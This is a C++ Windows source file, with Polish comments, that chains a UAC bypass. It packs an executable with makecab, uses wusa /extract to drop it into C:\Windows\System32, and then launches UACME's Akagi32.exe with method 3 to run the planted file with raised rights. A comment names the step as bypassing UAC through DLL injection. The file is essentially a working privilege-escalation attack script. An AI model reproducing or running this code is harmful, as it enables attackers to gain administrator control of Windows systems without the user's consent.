#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <iostream>
//#include <shellapi.h>
#include <windows.h>
#include <tchar.h>

using namespace std;

int main()
{

	char bufor[512];
	sprintf(bufor, " \"c:\\Users\\Damian\\Desktop\\wusa\\implementacja_vhost.exe\" \"c:\\Users\\Damian\\Desktop\\wusa\\implementacja_vhost.cab\"");
	wchar_t bufor2[200];
	mbstowcs(bufor2, bufor, strlen(bufor) + 1);
	LPWSTR ptr = bufor2;
	
	char bufor_copy[512];
	sprintf(bufor_copy, "\"C:\\Users\\Damian\\Desktop\\wusa\\implementacja_vhost.cab\" /extract:\"C:\\Windows\\System32\"");
	wchar_t bufor2_copy[200];
	mbstowcs(bufor2_copy, bufor_copy, strlen(bufor_copy) + 1);
	LPWSTR ptr2 = bufor2_copy;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	BOOL bSucces = CreateProcess((LPWSTR)(L"C:\\Windows\\System32\\makecab.exe"), ptr, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
	if (bSucces)
	{
		cout << "Process Started" << endl
			<< "Process ID:  " << pi.dwProcessId << endl;
		// Wait until child process exits.
		WaitForSingleObject(pi.hProcess, INFINITE);

		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else
	{
		cout << "Error to start a process    " << GetLastError() << endl;
	}
	cout << "rozpoczynam teraz kopiowanie wusa" << endl;
	//ShellExecute(NULL, NULL, _T("wusa.exe"), ptr2, NULL, SW_SHOWNORMAL);
	HINSTANCE blad=ShellExecute(NULL, L"open", L"wusa", L"C:\\Users\\Damian\\Desktop\\wusa\\implementacja_vhost.cab /extract:C:\\Windows\\System32", NULL, SW_SHOWNORMAL);
	cout << blad << endl;

	/////////////////////////////////////////////////////////////////
	//przechodzimy teraz do odpalenia bypassingu UAC
	cout << "przechodze do wlasciwego dll injection" << endl;
	blad = ShellExecute(NULL, L"open", L"C:\\Users\\Damian\\Desktop\\uac\\uacme_master\\UACME_master\\UACME_master\\Compiled\\Akagi32.exe", L"3 \"C:\\Windows\\System32\\implementacja_vhost.exe\"", NULL, SW_SHOWNORMAL);
	cout << blad << endl;
	cin.get();

}